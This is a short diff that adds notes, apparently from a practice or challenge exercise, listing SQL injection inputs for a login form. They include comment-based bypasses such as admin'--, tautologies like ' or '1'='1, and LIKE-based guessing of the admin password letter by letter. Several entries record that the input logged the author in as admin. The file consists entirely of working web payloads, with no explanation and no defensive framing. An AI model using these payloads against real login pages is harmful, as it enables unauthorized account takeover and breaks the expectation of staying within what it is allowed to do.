@@ -1,0 +1,20 @@
+Username: admin'--
+Password: SELECT * FROM members WHERE username = 'admin'--' AND password = 'password' 
+Logged me in as admin
+
+Username: admin
+Password: whatever' or '1'='1
+Logged me in as admin
+
+Username: admin'/*
+Password: ' or 1=1/*
+
+username: admin
+Password: ' or password like 'a%
+
+username: admin
+Password: ' or password like 'b%
+
+username: admin
+Password: ' or password like 'k%
+Logged me in as admin
